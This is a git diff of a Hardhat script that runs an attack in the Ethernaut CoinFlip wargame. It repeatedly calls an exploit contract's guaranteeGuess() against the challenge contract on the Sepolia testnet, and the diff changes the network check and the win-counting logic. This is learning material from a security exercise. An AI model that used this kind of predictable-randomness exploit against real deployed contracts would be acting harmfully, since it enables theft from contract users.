@@ -1,17 +1,17 @@
 import { ethers, network } from "hardhat";
 import * as dotenv from 'dotenv';
 import { Contract, providers, Signer } from "ethers";
+import { setTimeout } from "timers/promises";
 
 dotenv.config();
 
 // Set the number of time you want to flip the coin
-const FLIP_NUM = 10;
-let lastBlock: number;
+const DESIRED_WINS = 10;
 
 async function main() {
     // We only verify on a testnet!
-    if (network.config.chainId != 5) {
-      console.log("Ethernaut contracts can only be attacked on the Goerli Network.");
+    if (network.config.chainId != 11155111) {
+      console.log("Ethernaut contracts in this repo can only be run on the Sepolia Network");
       
     } else {
         // Initialize variables needed to access the coin flip contract
@@ -30,23 +30,18 @@ async function main() {
         // Set consecutive wins to 0
         let wins = await contract.consecutiveWins();
 
-        // Attack the contract for the desired number of times
-        // Loop while consecutive wins is less than the desired number of wins
-        while (wins < FLIP_NUM) {
-            const block: number = await ethers.provider.getBlockNumber();
-            if (block == lastBlock) {
-              console.log("Waiting for block to finish mining...");
-              setTimeout(() => {}, 30000);
-            } else {
-              console.log("Guessing coin flip...");
-              const transactionResponse = await exploitFlipContract.guaranteeGuess();
-              transactionResponse.wait(14);
-              console.log(`Consecutive Wins: ${wins}`);
-            }
-            lastBlock = block;
+        if (wins < DESIRED_WINS) {
+            const transactionResponse = await exploitFlipContract.guaranteeGuess();
+            transactionResponse.wait(2);
+            wins = await contract.consecutiveWins();
+            console.log(`Consecutive Wins: ${wins}`);
         }
 
-        (wins == FLIP_NUM) ? console.log("Attacked Successful") : console.log("Attacked Failed");
+        if (wins == 0) {
+            console.log('Attack Failed');
+        }
+
+        (wins == DESIRED_WINS) ? console.log("Attacked Successful") : console.log(`${DESIRED_WINS - wins} flips needed`);
     }
   }
   
